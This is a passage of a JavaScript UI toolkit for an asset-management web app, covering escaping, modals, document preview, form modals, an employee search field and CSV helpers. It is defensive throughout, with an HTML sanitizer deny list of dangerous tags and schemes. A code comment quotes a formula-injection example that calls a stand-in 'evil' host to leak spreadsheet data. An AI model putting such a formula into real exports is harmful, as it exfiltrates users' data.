/*
 * Small UI toolkit: escaping, badges, modals, toasts, form modals.
 *
 * XSS policy: every dynamic value that enters an HTML template MUST go
 * through esc() (HTML entity encoding). innerHTML is only ever assigned
 * trusted static markup combined with esc()-encoded values — never raw
 * user/API input.
 */
'use strict';

const $ = (sel, root) => (root || document).querySelector(sel);
const $$ = (sel, root) => Array.from((root || document).querySelectorAll(sel));

function esc(v) {
  return String(v == null ? '' : v)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function docMimeIcon(mime) {
  return mime && mime.includes('pdf') ? 'picture_as_pdf' : 'image';
}

/** Document name cell: clickable when canDownload, blurred lock overlay otherwise. */
function docFileLabel(d, { canDownload, viewAttr = 'data-doc-view' } = {}) {
  const id = esc(d.id);
  const name = esc(d.filename);
  const icon = docMimeIcon(d.mime);
  const lockedTip = esc(t('doc.viewLocked') || 'File on file — viewing locked');
  if (canDownload) {
    return `<div class="doc-cell">
      <span class="ms doc-cell-icon" style="color:var(--on-surface-variant)">${icon}</span>
      <a href="#" class="cell-title doc-link" ${viewAttr}="${id}" title="${esc(t('common.view') || 'View')}">${name}</a>
    </div>`;
  }
  return `<div class="doc-cell">
    <span class="ms doc-cell-icon" style="color:var(--on-surface-variant)">${icon}</span>
    <div class="doc-locked" title="${lockedTip}">
      <span class="doc-locked-filename">${name}</span>
      <span class="doc-locked-badge"><span class="ms ms-sm">lock</span>${lockedTip}</span>
    </div>
  </div>`;
}

/** View/download/delete action buttons for document table rows. */
function docRowActions(d, { canDownload, canDel, viewAttr = 'data-doc-view', dlAttr = 'data-doc-dl', delAttr = 'data-doc-del' } = {}) {
  const id = esc(d.id);
  const lockedTip = esc(t('doc.viewLocked') || 'File on file — viewing locked');
  if (!canDownload && !canDel) return '';
  return `${canDownload ? `
    <button type="button" class="btn btn-outline btn-sm" ${viewAttr}="${id}" title="${esc(t('common.view') || 'View')}"><span class="ms">visibility</span></button>
    <button type="button" class="btn btn-outline btn-sm" ${dlAttr}="${id}" title="${esc(t('common.download') || 'Download')}"><span class="ms">download</span></button>` : `
    <span class="btn btn-outline btn-sm doc-btn-locked" title="${lockedTip}"><span class="ms">lock</span></span>`}
    ${canDel ? `<button type="button" class="btn btn-outline btn-sm" ${delAttr}="${id}"><span class="ms">delete</span></button>` : ''}`;
}

/** Inline blurred chips for compact document lists (e.g. asset history). */
function docInlineLinks(docs, { canDownload, viewAttr = 'data-mdoc-dl' } = {}) {
  const lockedTip = esc(t('doc.viewLocked') || 'File on file — viewing locked');
  return (docs || []).map((d) => {
    if (canDownload) {
      return `<a href="#" ${viewAttr}="${esc(d.id)}" class="doc-link">${esc(d.filename)}</a>`;
    }
    return `<span class="doc-locked doc-locked-inline" title="${lockedTip}">
      <span class="doc-locked-filename">${esc(d.filename)}</span>
      <span class="doc-locked-badge"><span class="ms ms-sm">lock</span></span>
    </span>`;
  }).join(' · ');
}

/** Strip dangerous markup from contenteditable print previews before innerHTML assignment. */
function sanitizePrintHtml(html) {
  const template = document.createElement('template');
  template.innerHTML = String(html || '');
  template.content.querySelectorAll(
    'script, iframe, object, embed, link, meta, base, form, svg, math'
  ).forEach((el) => el.remove());
  const walk = (root) => {
    [...root.querySelectorAll('*')].forEach((el) => {
      [...el.attributes].forEach((attr) => {
        const name = attr.name.toLowerCase();
        const val = String(attr.value || '').trim().toLowerCase();
        const drop =
          name.startsWith('on')
          || name === 'srcdoc'
          || name === 'xlink:href'
          || name === 'formaction'
          || ((name === 'href' || name === 'src' || name === 'action' || name === 'poster')
            && (val.startsWith('javascript:') || val.startsWith('data:text/html') || val.startsWith('vbscript:')));
        if (drop) el.removeAttribute(attr.name);
      });
      walk(el);
    });
  };
  walk(template.content);
  return template.innerHTML;
}

/** Safe http(s) href for anchors; returns null if scheme is not allowed. */
function safeHref(url) {
  const s = String(url == null ? '' : url).trim();
  if (!s) return null;
  try {
    const u = new URL(s, window.location.origin);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
    return u.href;
  } catch {
    return null;
  }
}

/** Navigation generation — views skip stale rerenders after route changes. */
let currentNavGen = 0;
function bumpNavGen() { return ++currentNavGen; }
function isStaleView(el) {
  return el && el.dataset.navGen && Number(el.dataset.navGen) !== currentNavGen;
}

const STATUS_PILLS = {
  'In Stock': 'pill-emerald',
  'Assigned': 'pill-indigo',
  'In Repair': 'pill-amber',
  'Scrap': 'pill-slate',
  'Sold': 'pill-blue',
  'Reserved': 'pill-amber',
  'Active': 'pill-emerald',
  'Inactive': 'pill-slate',
  'Owner': 'pill-rose',
  'Admin': 'pill-indigo',
  'Helpdesk': 'pill-emerald',
  'Viewer': 'pill-slate',
  'assigned': 'pill-indigo',
  'returned': 'pill-emerald',
  'sent_to_repair': 'pill-amber',
  'repair_update': 'pill-amber',
  'created': 'pill-blue',
  'updated': 'pill-slate',
  'placed': 'pill-indigo',
  'responsible_changed': 'pill-indigo',
  'status_changed': 'pill-amber',
  'line_assigned': 'pill-blue',
  'line_unassigned': 'pill-rose',
  'Completed': 'pill-emerald',
};
function badge(text) {
  return `<span class="pill ${STATUS_PILLS[text] || 'pill-slate'}">${esc(text)}</span>`;
}

/** "Elif Yılmaz" → "EY" for avatar circles. */
function initials(name) {
  return String(name || '?').trim().split(/\s+/).map((w) => w[0]).slice(0, 2).join('').toUpperCase();
}

/** Material Symbols icon inside a colored chip square. */
function iconChip(icon, tone) {
  return `<span class="icon-chip chip-${tone}"><span class="ms">${icon}</span></span>`;
}

/**
 * Attach a delegated click handler to a view container, aborting the previous
 * one first. Views re-render into the same #view element, so without this,
 * listeners would accumulate across renders and navigations (double modals,
 * repeated print dialogs).
 */
function bindView(el, handler) {
  if (el._viewAbort) el._viewAbort.abort();
  el._viewAbort = new AbortController();
  el.addEventListener('click', handler, { signal: el._viewAbort.signal });
}

function fmtDate(v) {
  if (!v) return '—';
  const d = typeof v === 'object' && v._seconds ? new Date(v._seconds * 1000) : new Date(v);
  return isNaN(d) ? '—' : d.toLocaleDateString();
}
function fmtDateTime(v) {
  if (!v) return '—';
  const d = typeof v === 'object' && v._seconds ? new Date(v._seconds * 1000) : new Date(v);
  return isNaN(d) ? '—' : d.toLocaleString();
}

/* ---- toasts ---- */
function toast(message, type = 'info') {
  const el = document.createElement('div');
  el.className = 'toast' + (type === 'error' ? ' toast-error' : type === 'success' ? ' toast-success' : type === 'warning' ? ' toast-warning' : '');
  el.textContent = message; // textContent: no markup interpretation
  $('#toast-root').appendChild(el);
  setTimeout(() => el.remove(), 4200);
}

/* ---- modals ---- */
function openModal({ title, body, foot, wide, xwide, onMount, onClose, dismissible = true, stack = false }) {
  if (!stack) closeModal(true);
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay' + (stack ? ' modal-stacked' : '');
  if (!dismissible) overlay.classList.add('modal-locked');
  const sizeClass = xwide ? ' modal-xl' : (wide ? ' modal-lg' : '');
  // body/foot are templates built by callers; all dynamic values inside them
  // are esc()-encoded at the call site.
  overlay.innerHTML = `
    <div class="modal${sizeClass}" role="dialog" aria-modal="true">
      <div class="modal-head">
        <h3>${esc(title)}</h3>
        ${dismissible ? '<button type="button" class="modal-close" data-close aria-label="Close">×</button>' : ''}
      </div>
      <div class="modal-body">${body == null ? '' : body}</div>
      ${foot ? `<div class="modal-foot">${foot}</div>` : ''}
    </div>`;
  // Backdrop dismiss: pointerdown AND click both on the overlay (not the sheet).
  // Bubble phase — avoids capture-phase pointerup races that dismiss a freshly
  // opened sheet or leave a dimmed lockout. Still ignores focus-scroll landings
  // where only the final click hits the dimmed area (parent-picker safe).
  const openedAt = Date.now();
  let backdropPointerDown = false;
  overlay.addEventListener('pointerdown', (e) => {
    backdropPointerDown = dismissible && e.target === overlay;
  });
  overlay.addEventListener('pointercancel', () => { backdropPointerDown = false; });
  overlay.addEventListener('click', (e) => {
    if (!dismissible) return;
    if (e.target.closest('[data-close]')) {
      closeModal();
      return;
    }
    if (Date.now() - openedAt < 275) {
      backdropPointerDown = false;
      return;
    }
    if (e.target === overlay && backdropPointerDown) closeModal();
    backdropPointerDown = false;
  });
  const onKey = (e) => {
    if (e.key !== 'Escape' || !dismissible) return;
    const top = $('#modal-root')?.lastElementChild;
    if (top !== overlay) return;
    e.preventDefault();
    closeModal();
  };
  document.addEventListener('keydown', onKey);
  const userOnClose = typeof onClose === 'function' ? onClose : null;
  overlay._onCloseCleanup = () => {
    document.removeEventListener('keydown', onKey);
    if (userOnClose) {
      try { userOnClose(); } catch { /* ignore */ }
    }
  };
  document.body.classList.add('modal-open');
  const root = $('#modal-root');
  if (!root) return overlay;
  root.appendChild(overlay);
  if (onMount) {
    try { onMount(overlay); } catch (err) {
      console.error(err);
      try { toast(err.message || 'Modal failed to initialize', 'error'); } catch { /* ignore */ }
    }
  }
  return overlay;
}
/** Close the topmost modal. Pass `all=true` to clear the whole stack (default openModal). */
function closeModal(all = false) {
  const root = $('#modal-root');
  if (!root) return;
  const closeOne = (open) => {
    if (!open) return;
    if (typeof open._onCloseCleanup === 'function') {
      const fn = open._onCloseCleanup;
      open._onCloseCleanup = null;
      try { fn(); } catch { /* ignore */ }
    }
    open.remove();
  };
  if (all) {
    while (root.firstElementChild) closeOne(root.lastElementChild);
  } else {
    closeOne(root.lastElementChild);
  }
  if (!root.firstElementChild) document.body.classList.remove('modal-open');
}

/** Download a Bearer-protected file (plain <a> cannot send Authorization). */
async function downloadAuthed(url) {
  try {
    const resp = await fetch(url, { headers: { Authorization: 'Bearer ' + Auth.token } });
    if (!resp.ok) throw new Error((await resp.json().catch(() => ({}))).error || 'Download failed');
    const blob = await resp.blob();
    const objUrl = URL.createObjectURL(blob);
    const dl = document.createElement('a');
    dl.href = objUrl;
    dl.download = (resp.headers.get('Content-Disposition') || '').match(/filename="(.+?)"/)?.[1] || 'document';
    document.body.appendChild(dl);
    dl.click();
    dl.remove();
    setTimeout(() => URL.revokeObjectURL(objUrl), 5000);
  } catch (err) { toast(err.message, 'error'); }
}

/**
 * PDF.js (Mozilla, Apache-2.0) vendored under js/vendor — loaded on first
 * preview only. Handing a blob to <embed> depends on a browser PDF plugin that
 * phones don't have (and some desktop builds don't either), so we rasterise the
 * pages ourselves and the preview stays in the same tab everywhere.
 */
function loadPdfJs() {
  if (window.pdfjsLib) return Promise.resolve(window.pdfjsLib);
  if (loadPdfJs._p) return loadPdfJs._p;
  loadPdfJs._p = new Promise((resolve, reject) => {
    const s = document.createElement('script');
    s.src = '/js/vendor/pdf.min.js';
    s.async = true;
    s.onload = () => {
      if (!window.pdfjsLib) { reject(new Error('PDF viewer failed to load')); return; }
      window.pdfjsLib.GlobalWorkerOptions.workerSrc = '/js/vendor/pdf.worker.min.js';
      resolve(window.pdfjsLib);
    };
    s.onerror = () => reject(new Error('PDF viewer failed to load'));
    document.head.appendChild(s);
  });
  return loadPdfJs._p;
}

const PDF_PREVIEW_MAX_PAGES = 20;

/** Draw every page of `data` (ArrayBuffer) into `host` as width-fitted canvases. */
async function renderPdfPreview(host, data, onFail) {
  try {
    const pdfjsLib = await loadPdfJs();
    const pdf = await pdfjsLib.getDocument({ data }).promise;
    const cssWidth = host.clientWidth || 600;
    // Cap the backing store so a phone doesn't blow its memory budget on a
    // retina-sized canvas per page.
    const dpr = Math.min(window.devicePixelRatio || 1, 2);
    host.innerHTML = '';
    const pageCount = Math.min(pdf.numPages, PDF_PREVIEW_MAX_PAGES);
    if (pageCount < 1) {
      // Structurally valid but empty (demo placeholders, truncated uploads) —
      // say so instead of leaving a blank box.
      host.innerHTML = `<div class="table-empty" style="padding:28px">${esc(t('doc.emptyPdf'))}</div>`;
      return;
    }
    for (let n = 1; n <= pageCount; n += 1) {
      const page = await pdf.getPage(n);
      const unit = page.getViewport({ scale: 1 });
      const viewport = page.getViewport({ scale: (cssWidth / unit.width) * dpr });
      const canvas = document.createElement('canvas');
      canvas.className = 'doc-pdf-page';
      canvas.width = Math.round(viewport.width);
      canvas.height = Math.round(viewport.height);
      host.appendChild(canvas);
      await page.render({ canvasContext: canvas.getContext('2d'), viewport }).promise;
    }
    if (pdf.numPages > pageCount) {
      const more = document.createElement('div');
      more.className = 'cell-sub doc-pdf-more';
      more.textContent = `+${pdf.numPages - pageCount}`;
      host.appendChild(more);
    }
  } catch {
    onFail();
  }
}

/**
 * Open a protected document in a stacked lightbox popup (does NOT close the
 * underlying employee/repair modal). PDFs and images render from a blob URL.
 */
async function viewAuthed(url, title) {
  try {
    const sep = url.includes('?') ? '&' : '?';
    const resp = await fetch(url + sep + 'view=1', { headers: { Authorization: 'Bearer ' + Auth.token } });
    if (!resp.ok) throw new Error((await resp.json().catch(() => ({}))).error || 'Could not open the document');
    const blob = await resp.blob();
    const headerMime = (resp.headers.get('Content-Type') || '').split(';')[0].trim().toLowerCase();
    const cd = resp.headers.get('Content-Disposition') || '';
    const star = cd.match(/filename\*=UTF-8''([^;]+)/i);
    const plain = cd.match(/filename="([^"]+)"/i) || cd.match(/filename=([^;]+)/i);
    let filename = title || 'Document';
    if (star) {
      try { filename = decodeURIComponent(star[1].trim()); } catch { /* keep */ }
    } else if (plain) {
      filename = plain[1].trim();
    }
    const looksPdf = headerMime === 'application/pdf' || /\.pdf$/i.test(filename)
      || (blob.type || '').toLowerCase() === 'application/pdf';
    const looksImg = /^image\//.test(headerMime) || /^image\//.test(blob.type || '')
      || /\.(png|jpe?g|webp|gif)$/i.test(filename);
    const mime = looksPdf ? 'application/pdf'
      : (looksImg ? (headerMime.startsWith('image/') ? headerMime : (blob.type || 'image/jpeg'))
        : ((blob.type || headerMime || '').split(';')[0].trim().toLowerCase()));
    const typed = new Blob([blob], { type: mime || 'application/octet-stream' });
    const objUrl = URL.createObjectURL(typed);
    const isImg = /^image\//.test(mime);
    const isPdf = mime === 'application/pdf';

    let media;
    if (isImg) {
      media = `<img class="doc-viewer-img" src="${objUrl}" alt="${esc(filename)}">`;
    } else if (isPdf) {
      // Pages are drawn into this host by renderPdfPreview() once the modal is in
      // the DOM (it needs the measured width).
      media = `<div class="doc-pdf" id="doc-pdf-host"><div class="table-empty">${esc(t('common.loading'))}</div></div>`;
    } else {
      media = `<div class="table-empty" style="padding:28px">${esc(t('doc.previewUnavailable'))}</div>`;
    }

    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay doc-lightbox';
    overlay.innerHTML = `
      <div class="modal modal-xl doc-lightbox-panel">
        <div class="modal-head">
          <h3>${esc(filename)}</h3>
          <button type="button" class="modal-close" data-doc-close aria-label="Close">×</button>
        </div>
        <div class="modal-body doc-lightbox-body">${media}</div>
        <div class="modal-foot">
          <button type="button" class="btn btn-outline" data-doc-close>${esc(t('common.close'))}</button>
          <a class="btn btn-primary" href="${objUrl}" download="${esc(filename)}">
            <span class="ms">download</span> ${esc(t('common.download'))}</a>
        </div>
      </div>`;
    let handedOff = false; // a tab now owns the blob — revoking would blank it
    const close = () => {
      if (!handedOff) { try { URL.revokeObjectURL(objUrl); } catch { /* ignore */ } }
      overlay.remove();
      if (!$('#modal-root')?.firstElementChild && !$('.doc-lightbox')) {
        document.body.classList.remove('modal-open');
      }
    };
    overlay.addEventListener('click', (e) => {
      if (e.target.closest('[data-doc-open]')) {
        handedOff = true;
        if (!window.open(objUrl, '_blank')) {
          // Popup blocked (common in in-app browsers) — hand the blob to this tab
          // instead. The native viewer takes over and Back returns to the app.
          toast(t('doc.popupBlocked'), 'error');
          try { window.location.assign(objUrl); } catch { /* download button remains */ }
        }
        return;
      }
      if (e.target === overlay || e.target.closest('[data-doc-close]')) close();
    });
    document.body.classList.add('modal-open');
    document.body.appendChild(overlay);

    if (isPdf) {
      const host = $('#doc-pdf-host', overlay);
      // Last resort only: if PDF.js itself can't load, offer the OS viewer.
      const onFail = () => {
        host.innerHTML = `
          <div class="doc-viewer-fallback">
            <span class="ms">picture_as_pdf</span>
            <p class="cell-sub">${esc(t('doc.previewUnavailable'))}</p>
            <button type="button" class="btn btn-primary btn-lg" data-doc-open>
              <span class="ms">open_in_new</span> ${esc(t('doc.openInTab'))}</button>
          </div>`;
      };
      renderPdfPreview(host, await typed.arrayBuffer(), onFail);
    }
  } catch (err) { toast(err.message, 'error'); }
}

/*
 * Declarative form modal.
 * fields: [{ name, label, type: text|number|email|password|date|select|textarea|checkbox|employeeSearch,
 *            options: [{value,label}], required, value, placeholder, full,
 *            selected: { id, fullName } // for employeeSearch }]
 */
function formModal({ title, fields, submitLabel, wide, onSubmit, onMount: extraMount, stack = false, onClose }) {
  const saveLbl = t(submitLabel || 'Save');
  const inputs = fields.map((f) => {
    if (f.type === 'html') {
      return `<div class="form-field ${f.full ? 'full' : ''}" ${f.id ? `id="${esc(f.id)}"` : ''}>${
        f.label ? `<label>${esc(t(f.label))}</label>` : ''
      }${f.html || ''}</div>`;
    }
    if (f.type === 'checkbox') {
      // The whole row is the label so the text itself toggles the box.
      return `<div class="form-field ${f.full ? 'full' : ''}">
        <label class="check-row"><input type="checkbox" name="${esc(f.name)}" ${f.value ? 'checked' : ''}>
        <span>${esc(t(f.label))}</span></label>${
        f.hint ? `<div class="check-hint">${esc(t(f.hint))}</div>` : ''}</div>`;
    }
    const val = f.value != null ? esc(f.value) : '';
    let control;
    if (f.type === 'employeeSearch') {
      control = `<div class="emp-search-host" data-emp-search="${esc(f.name)}"></div>`;
    } else if (f.type === 'selectOther') {
      const OTHER = '__other__';
      const opts = f.options || [];
      const isOtherish = (v) => v === OTHER || /^other$/i.test(String(v || ''));
      const known = opts.some((o) => String(typeof o === 'object' ? o.value : o) === String(f.value ?? ''));
      const useOther = !!(f.value && !known) || isOtherish(f.value);
      const selectOtherOpt = !!(f.value && !known);
      control = `<select name="${esc(f.name)}" data-select-other="${esc(f.name)}" ${f.required ? 'required' : ''}>
        ${opts.map((o) => {
          const v = typeof o === 'object' ? o.value : o;
          const l = typeof o === 'object' ? o.label : o;
          return `<option value="${esc(v)}" ${!selectOtherOpt && String(v) === String(f.value) ? 'selected' : ''}>${esc(l)}</option>`;
        }).join('')}
        <option value="${OTHER}" ${selectOtherOpt ? 'selected' : ''}>${esc(f.otherLabel || 'Other (type manually)…')}</option>
      </select>
      <input type="text" name="${esc(f.name)}__other" maxlength="${f.maxLength || 60}"
        class="${useOther ? '' : 'hidden'}" data-other-for="${esc(f.name)}"
        placeholder="${esc(f.otherPlaceholder || 'Type custom value…')}"
        value="${selectOtherOpt ? esc(f.value) : ''}" style="margin-top:8px">`;
    } else if (f.type === 'select') {
      control = `<select name="${esc(f.name)}" ${f.required ? 'required' : ''}>
        ${(f.options || []).map((o) => {
          const v = typeof o === 'object' ? o.value : o;
          const l = typeof o === 'object' ? o.label : o;
          return `<option value="${esc(v)}" ${String(v) === String(f.value) ? 'selected' : ''}>${esc(l)}</option>`;
        }).join('')}
      </select>`;
    } else if (f.type === 'textarea') {
      control = `<textarea name="${esc(f.name)}" placeholder="${esc(f.placeholder || '')}">${val}</textarea>`;
    } else {
      control = `<input type="${f.type || 'text'}" name="${esc(f.name)}" value="${val}"
        placeholder="${esc(f.placeholder || '')}" ${f.required ? 'required' : ''} ${f.step ? `step="${f.step}"` : ''}>`;
    }
    return `<div class="form-field ${f.full ? 'full' : ''}"><label>${esc(t(f.label))}</label>${control}</div>`;
  }).join('');

  openModal({
    title: t(title),
    wide,
    stack,
    onClose,
    body: `<form id="modal-form"><div class="form-grid">${inputs}</div><div id="modal-form-error"></div></form>`,
    foot: `<button class="btn btn-outline" data-close>${esc(t('common.cancel'))}</button>
           <button class="btn btn-primary" type="submit" form="modal-form">${esc(saveLbl)}</button>`,
    onMount(overlay) {
      const form = $('#modal-form', overlay);
      const pickers = {};
      fields.forEach((f) => {
        if (f.type !== 'employeeSearch') return;
        const host = overlay.querySelector(`[data-emp-search="${f.name}"]`);
        if (!host) return;
        pickers[f.name] = mountEmployeeSearchField(host, {
          name: f.name,
          selected: f.selected || (f.value ? { id: f.value, fullName: f.selectedLabel || '' } : null),
          required: !!f.required,
          placeholder: f.placeholder,
          searchUrl: f.searchUrl,
          excludeIds: f.excludeIds,
        });
      });
      overlay.querySelectorAll('select[data-select-other]').forEach((sel) => {
        const other = overlay.querySelector(`input[data-other-for="${sel.dataset.selectOther}"]`);
        if (!other) return;
        const sync = () => {
          const show = sel.value === '__other__' || /^other$/i.test(sel.value);
          other.classList.toggle('hidden', !show);
          if (show) other.focus();
        };
        sel.addEventListener('change', sync);
      });
      if (typeof extraMount === 'function') extraMount(overlay, form);
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const data = {};
        for (const f of fields) {
          if (f.type === 'html') continue;
          if (f.type === 'employeeSearch') {
            const picker = pickers[f.name];
            if (picker && f.required && !picker.validate()) {
              toast(t('network.ownerRequired') || 'Responsible person is required', 'error');
              return;
            }
            const id = picker ? picker.getId() : '';
            data[f.name] = id || undefined;
            continue;
          }
          if (f.type === 'selectOther') {
            let v = form.elements[f.name].value;
            const custom = String(form.elements[`${f.name}__other`]?.value || '').trim();
            if (v === '__other__') {
              if (!custom) {
                toast(f.otherRequiredMsg || 'Please type a custom value', 'error');
                return;
              }
              v = custom;
            } else if (/^other$/i.test(v) && custom) {
              v = custom;
            }
            data[f.name] = v || undefined;
            continue;
          }
          if (f.type === 'checkbox') {
            data[f.name] = !!form.elements[f.name].checked;
            continue;
          }
          let v = form.elements[f.name].value;
          if (f.type === 'number') v = v === '' ? undefined : Number(v);
          if (v === '') v = undefined;
          data[f.name] = v;
        }
        const btn = overlay.querySelector('.modal-foot .btn-primary');
        btn.disabled = true;
        try {
          await onSubmit(data);
          closeModal();
        } catch (err) {
          btn.disabled = false;
          toast(err.message + (err.details
            ? ' — ' + err.details.map((d) => d.reason || JSON.stringify(d)).join('; ')
            : ''), 'error');
          const box = $('#modal-form-error', overlay);
          if (box) box.innerHTML = '';
        }
      });
      const first = form.querySelector('input:not([type="hidden"]),select,textarea');
      if (first) first.focus();
    },
  });
}

/**
 * Inline employee typeahead (server-side search). Works inside modals.
 * Returns { getId, getSelected, setSelected, clear }.
 */
function mountEmployeeSearchField(container, {
  name = 'employeeId',
  selected = null,
  required = false,
  placeholder,
  excludeIds = [],
  onChange,
  // Override the source of candidates. Anything returning
  // [{ id, fullName, email, department }] works — e.g. the IT-user form points
  // this at employees who do NOT already hold a login.
  searchUrl = null,
} = {}) {
  const ph = placeholder || t('common.searchEmployee') || 'Search by name, email or department…';
  const excluded = new Set((excludeIds || []).filter(Boolean));
  let current = selected && selected.id
    ? { id: selected.id, fullName: selected.fullName || selected.id }
    : null;
  let timer = null;
  let seq = 0;

  // Do NOT put HTML `required` on the hidden input — browsers block submit
  // silently when a hidden required field is empty (no visible validation UI).
  container.innerHTML = `
    <input type="hidden" name="${esc(name)}" value="${esc(current ? current.id : '')}" data-emp-required="${required ? '1' : '0'}">
    <div class="emp-search-picked ${current ? '' : 'hidden'}" data-picked>
      <span class="avatar" data-av>${current ? esc(initials(current.fullName)) : ''}</span>
      <div class="grow">
        <strong data-name>${current ? esc(current.fullName) : ''}</strong>
        <span class="cell-sub" data-meta></span>
      </div>
      <button type="button" class="btn btn-outline btn-sm" data-clear title="Clear">
        <span class="ms">close</span>
      </button>
    </div>
    <div class="emp-search-find ${current ? 'hidden' : ''}" data-find>
      <div class="search-box"><span class="ms">search</span>
        <input type="text" data-q placeholder="${esc(ph)}" autocomplete="off" spellcheck="false"></div>
      <div class="emp-search-results" data-results>
        <div class="cell-sub">${esc(t('common.typeToSearch') || 'Type a name to filter…')}</div>
      </div>
    </div>
    <div class="emp-search-error hidden" data-err></div>`;

  const hidden = container.querySelector(`input[name="${name}"]`);
  const picked = $('[data-picked]', container);
  const find = $('[data-find]', container);
  const q = $('[data-q]', container);
  const results = $('[data-results]', container);
  const errEl = $('[data-err]', container);

  function setError(msg) {
    if (!msg) {
      errEl.classList.add('hidden');
      errEl.textContent = '';
      container.classList.remove('emp-search-invalid');
      return;
    }
    errEl.textContent = msg;
    errEl.classList.remove('hidden');
    container.classList.add('emp-search-invalid');
  }

  function showPicked(emp) {
    current = emp;
    hidden.value = emp ? emp.id : '';
    setError('');
    if (emp) {
      $('[data-av]', picked).textContent = initials(emp.fullName);
      $('[data-name]', picked).textContent = emp.fullName;
      $('[data-meta]', picked).textContent = [emp.department, emp.email].filter(Boolean).join(' · ');
      picked.classList.remove('hidden');
      find.classList.add('hidden');
      q.value = '';
      results.innerHTML = `<div class="cell-sub">${esc(t('common.typeToSearch') || 'Type a name to filter…')}</div>`;
    } else {
      picked.classList.add('hidden');
      find.classList.remove('hidden');
      setTimeout(() => q.focus(), 30);
    }
    if (typeof onChange === 'function') onChange(emp);
  }

  function renderList(emps) {
    const list = (emps || []).filter((p) => !excluded.has(p.id));
    if (!list.length) {
      results.innerHTML = `<div class="cell-sub">${esc(t('common.noMatches') || 'No matching employees.')}</div>`;
      return;
    }
    results.innerHTML = list.map((p) => `
      <button type="button" class="emp-search-item" data-id="${esc(p.id)}"
        data-name="${esc(p.fullName)}" data-dept="${esc(p.department || '')}" data-email="${esc(p.email || '')}">
        <span class="avatar">${esc(initials(p.fullName))}</span>
        <div class="grow">
          <strong>${esc(p.fullName)}</strong>
          <span class="cell-sub">${esc(p.department || '—')} · ${esc(p.email || '')}</span>
        </div>
      </button>`).join('');
    results.querySelectorAll('.emp-search-item').forEach((btn) => {
      btn.addEventListener('click', () => {
        showPicked({
          id: btn.dataset.id,
          fullName: btn.dataset.name,
          department: btn.dataset.dept,
          email: btn.dataset.email,
        });
      });
    });
  }

  async function runSearch(term, my) {
    try {
      const qParam = term
        ? `&search=${encodeURIComponent(term)}`
        : '';
      const base = searchUrl || '/employees?status=Active';
      const sep = base.includes('?') ? '&' : '?';
      const res = await api(`${base}${sep}limit=40${qParam}`);
      if (my !== seq) return;
      renderList(employeeList(res).items);
    } catch {
      if (my === seq) renderList([]);
    }
  }

  $('[data-clear]', container).addEventListener('click', () => showPicked(null));

  q.addEventListener('focus', () => {
    clearTimeout(timer);
    setError('');
    const term = q.value.trim();
    // Empty focus → browse recent/active people so this never looks like a blank select.
    if (term.length < 1) {
      const my = ++seq;
      results.innerHTML = `<div class="cell-sub">${esc(t('common.loading') || 'Loading…')}</div>`;
      runSearch('', my);
    }
  });

  q.addEventListener('input', () => {
    clearTimeout(timer);
    setError('');
    const term = q.value.trim();
    const my = ++seq;
    if (term.length < 1) {
      timer = setTimeout(() => runSearch('', my), 120);
      return;
    }
    results.innerHTML = `<div class="cell-sub">${esc(t('common.loading') || 'Loading…')}</div>`;
    timer = setTimeout(() => runSearch(term, my), 200);
  });

  if (current && current.id && !current.department) {
    api(`/employees?status=Active&limit=5&search=${encodeURIComponent(current.fullName || '')}`)
      .then((res) => {
        const hit = employeeList(res).items.find((p) => p.id === current.id);
        if (hit) showPicked(hit);
      })
      .catch(() => {});
  }

  return {
    getId: () => hidden.value || null,
    getSelected: () => (current ? { ...current } : null),
    setSelected: showPicked,
    clear: () => showPicked(null),
    validate() {
      if (!required) { setError(''); return true; }
      if (hidden.value) { setError(''); return true; }
      setError(t('network.ownerRequired') || 'Responsible person is required');
      find.classList.remove('hidden');
      q.focus();
      return false;
    },
  };
}

function confirmModal(message, onYes) {
  openModal({
    title: t('common.confirm'),
    body: `<p style="margin:0">${esc(message)}</p>`,
    foot: `<button class="btn btn-outline" data-close>${esc(t('common.cancel'))}</button>
           <button class="btn btn-danger" id="confirm-yes">${esc(t('common.confirm'))}</button>`,
    onMount(overlay) {
      $('#confirm-yes', overlay).addEventListener('click', async () => {
        try { await onYes(); closeModal(); }
        catch (err) { toast(err.message, 'error'); }
      });
    },
  });
}

/*
 * Minimal CSV parser for the import flows. Handles quoted fields (with "" as
 * an escaped quote), CRLF, and auto-detects ; vs , as the separator (Turkish
 * Excel saves CSV with semicolons). Returns an array of objects keyed by the
 * header row.
 */
function parseCsv(text) {
  const src = String(text || '').replace(/^﻿/, '');
  const firstLine = src.slice(0, src.indexOf('\n') === -1 ? src.length : src.indexOf('\n'));
  const sep = (firstLine.match(/;/g) || []).length >= (firstLine.match(/,/g) || []).length ? ';' : ',';

  const rows = [];
  let field = '', row = [], inQ = false;
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (inQ) {
      if (ch === '"') {
        if (src[i + 1] === '"') { field += '"'; i++; } else inQ = false;
      } else field += ch;
    } else if (ch === '"') inQ = true;
    else if (ch === sep) { row.push(field); field = ''; }
    else if (ch === '\n' || ch === '\r') {
      if (ch === '\r' && src[i + 1] === '\n') i++;
      row.push(field); field = '';
      if (row.some((c) => c.trim() !== '')) rows.push(row);
      row = [];
    } else field += ch;
  }
  row.push(field);
  if (row.some((c) => c.trim() !== '')) rows.push(row);

  if (rows.length < 2) return [];
  const head = rows[0].map((h) => h.trim());
  return rows.slice(1).map((r) => Object.fromEntries(head.map((h, i) => [h, (r[i] ?? '').trim()])));
}

/* ---------- Multi-select toolbar filters (Network / Hardware / Employees) ---------- */
function csvList(v) {
  return String(v || '').split(',').map((s) => s.trim()).filter(Boolean);
}

/**
 * Neutralize spreadsheet formula injection in an exported CSV cell value.
 * A leading = + - @ (or tab/CR) makes Excel/Sheets treat the cell as a formula,
 * so a field like `=HYPERLINK("http://evil"&A1)` would execute on open. Prefix a
 * single quote to force text — but leave plain numbers (incl. negatives / phone
 * `+90…`) untouched so report figures aren't corrupted. Caller still wraps the
 * result in quotes and doubles any embedded quotes.
 */
function csvCell(v) {
  const s = String(v == null ? '' : v);
  if (/^[=+\-@\t\r]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s)) return `'${s}`;
  return s;
}

function multiSelectHtml({ id, allLabel, selected, options }) {
  const selList = Array.isArray(selected) ? selected : csvList(selected);
  const n = selList.length;
